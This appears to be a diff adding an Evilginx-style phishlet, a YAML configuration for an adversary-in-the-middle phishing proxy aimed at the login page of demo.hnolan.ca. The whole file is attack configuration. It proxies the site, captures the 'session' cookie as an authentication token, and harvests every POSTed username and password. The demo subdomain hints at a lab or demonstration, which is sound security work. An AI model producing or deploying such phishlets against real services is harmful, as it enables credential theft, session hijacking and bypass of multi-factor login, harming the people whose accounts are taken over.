@@ -1,0 +1,18 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'demo', orig_sub: 'demo', domain: 'hnolan.ca', session: true, is_landing: true, auto_filter: true}
+auth_tokens:
+  - domain: '.demo.hnolan.ca'
+    keys: ['session']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'demo.hnolan.ca'
+  path: '/login'
